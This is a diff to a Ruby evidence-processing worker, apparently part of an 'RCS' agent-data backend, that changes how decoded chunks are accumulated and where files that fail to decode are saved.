@@ -103,7 +103,7 @@ class InstanceWorker
             decoded_data = ''
             evidences, action = begin
               RCS::Evidence.new(@key).deserialize(raw) do |data|
-                decoded_data = data
+                decoded_data += data unless data.nil?
               end
             rescue EmptyEvidenceError => e
               trace :info, "[#{raw_id}:#{@ident}:#{@instance}] deleting empty evidence #{raw_id}"
@@ -114,7 +114,7 @@ class InstanceWorker
               RCS::DB::GridFS.delete(evidence_id, "evidence")
 
               Dir.mkdir "decoding_failed" unless File.exists? "decoding_failed"
-              path = "decoding_failed/#{evidence_id}.raw"
+              path = "decoding_failed/#{evidence_id}.dec"
               f = File.open(path, 'wb') {|f| f.write decoded_data}
               trace :debug, "[#{raw_id}] forwarded undecoded evidence #{raw_id} to #{path}"
               next
@@ -188,8 +188,6 @@ class InstanceWorker
               end
             end
 
-
-
             processing_time = Time.now - start_time
             trace :info, "[#{raw_id}] processed #{ev_type.upcase} for agent #{@agent['name']} in #{processing_time} sec"
 
@@ -201,8 +199,8 @@ class InstanceWorker
             trace :fatal, "[#{raw_id}:#{@ident}:#{@instance}] Unrecoverable error processing evidence #{raw_id}: #{e.message}"
             trace :debug, "[#{raw_id}:#{@ident}:#{@instance}] EXCEPTION: " + e.backtrace.join("\n")
 
-            Dir.mkdir "forwarded" unless File.exists? "forwarded"
-            path = "forwarded/#{raw_id}.raw"
+            Dir.mkdir "decoding_failed" unless File.exists? "decoding_failed"
+            path = "decoding_failed/#{raw_id}.dec"
             f = File.open(path, 'wb') {|f| f.write decoded_data}
             trace :debug, "[#{raw_id}] forwarded undecoded evidence #{raw_id} to #{path}"
           end
